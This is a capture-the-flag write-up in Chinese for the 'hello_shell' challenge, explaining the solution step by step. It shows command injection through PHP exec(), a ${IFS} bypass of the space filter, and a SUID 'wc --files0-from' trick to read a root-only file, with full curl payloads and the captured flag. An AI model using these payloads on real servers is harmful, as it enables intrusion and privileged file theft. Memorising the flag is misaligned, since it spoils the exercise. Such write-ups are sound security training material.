# hello_shell

## 题目简述

页面把用户可控的 `cmd` 直接传给 PHP `exec()`，只过滤普通空格，并且没有输出命令结果。容器还在网站工作目录放置了一个 root 所有、带 SUID 的 `wc`，而 `/flag` 仅 root 可读，因此需要先绕过空格限制，再利用 `wc --files0-from` 的报错完成特权文件读取。

## 解题过程

核心源码如下：

```php
$cmd = $_REQUEST['cmd'] ?? 'ls';
if (strpos($cmd, ' ') !== false) {
    die('no space allowed');
}
@exec($cmd);
```

PHP 官方文档说明，`exec()` 只在传入输出数组时收集完整输出；本题既没有接收返回值，也没有把输出数组打印到响应中，所以直接执行 `cat /flag` 看不到结果。[PHP exec 文档](https://www.php.net/manual/en/function.exec.php)仅作为函数行为参考，关键行为已在此说明。

过滤只检查 ASCII 空格，可以用 shell 变量 `${IFS}` 在执行阶段产生分隔符。先用一个无害命令把输出重定向到 Web 目录，验证命令执行：

```bash
curl -s -X POST \
  --data-urlencode 'cmd=id${IFS}>result.txt${IFS}2>&1' \
  'http://TARGET/'
curl -s 'http://TARGET/result.txt'
```

Dockerfile 中的关键配置为：

```dockerfile
COPY ./sct/flag /flag
RUN chmod 600 /flag && install -m =xs $(which wc) .
```

`install -m =xs` 复制出带 SUID 的 `wc`。`wc --files0-from FILE` 会把 `FILE` 内容解释成以 NUL 分隔的文件名；当这些“文件名”不存在时，内容会出现在错误消息中。GTFOBins 的 [wc 条目](https://gtfobins.org/gtfobins/wc/)记录了相同的文件读取原语和 SUID 条件。

利用时把标准输出和错误输出都写到可访问文件：

```bash
curl -s -X POST \
  --data-urlencode 'cmd=./wc${IFS}--files0-from${IFS}/flag${IFS}>result.txt${IFS}2>&1' \
  'http://TARGET/'
curl -s 'http://TARGET/result.txt'
```

响应文件中的错误消息会包含：

```text
0xgame{0b0bb1a4-709d-41cd-9294-e70aa3510151}
```

## 方法总结

本题的利用链是“无回显命令执行 → `${IFS}` 绕过空格 → SUID `wc` 特权读文件 → 重定向到 Web 目录”。无需依赖反弹 shell 或临时外带平台，稳定机制和完整请求都可以在本地复现。
